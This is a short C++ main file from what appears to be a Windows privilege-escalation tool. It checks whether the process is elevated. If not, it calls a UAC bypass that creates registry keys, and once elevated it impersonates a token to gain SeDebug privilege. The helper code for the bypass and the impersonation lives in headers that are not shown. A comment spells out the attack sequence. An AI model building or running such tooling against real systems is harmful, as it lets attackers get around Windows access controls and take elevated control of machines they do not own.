#include <iostream>
#include "bpuac.h"
#include "checkPrivs.h"
#include "impToken.h"

int main() {
    /*
     *
     * Program will run through the loop in the following order
     * 1.   Check if the program is currently elevated
     * 2.   If the program is not elevated the normal sequence will execute
     * 2a.  Call bypass, creating the requisite reg keys and process open function
     * 2b.  return to main where it will then check if it's elevated
     * 3.   if the program is elevated it call impToken, changing to a SEDebug token
     * 4.   return to here
     *
     */
    if (core::isElevated()) {
        core::it();
        std::cin.get();
    } else {
        core::bypass();
    }
}
